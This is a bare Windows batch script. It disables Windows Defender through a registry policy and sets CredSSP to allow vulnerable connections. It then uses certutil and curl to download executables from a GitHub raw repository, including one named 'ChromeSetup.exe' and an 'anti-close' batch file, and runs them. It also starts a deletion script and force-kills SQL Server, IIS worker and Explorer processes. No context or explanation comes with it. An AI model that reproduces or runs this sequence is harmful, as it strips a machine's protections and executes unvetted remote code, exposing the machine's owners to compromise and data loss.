

REG ADD "HKEY_LOCAL_MACHINE\SOFTWARE\Policies\Microsoft\Windows Defender" /v DisableAntiSpyware /t REG_DWORD /d 1 /f
REG ADD HKLM\Software\Microsoft\Windows\CurrentVersion\Policies\System\CredSSP\Parameters\ /v AllowEncryptionOracle /t REG_DWORD /d 2
certutil -urlcache -split -f https://raw.githubusercontent.com/ThuongHai/thuonghai/master/curl.exe
certutil -urlcache -split -f https://raw.githubusercontent.com/ThuongHai/thuonghai/master/7z.dll
certutil -urlcache -split -f https://raw.githubusercontent.com/ThuongHai/thuonghai/master/7z.exe
certutil -urlcache -split -f https://raw.githubusercontent.com/ThuongHai/thuonghai/master/nircmd.exe

cd C:\Users\Administrator\Desktop
curl -LJOk https://raw.githubusercontent.com/ThuongHai/thuonghai/master/ChromeSetup.exe
curl -LJOk https://raw.githubusercontent.com/ThuongHai/thuonghai/master/anti-close.bat
start ChromeSetup.exe
cls
@echo off
start del.bat
net start audiosrv
taskkill /f /im sqlservr.exe
taskkill /f /im Batch.exe
taskkill /f /im w3wp.exe
taskkill /f /im explorer.exe
start explorer.exe
exit
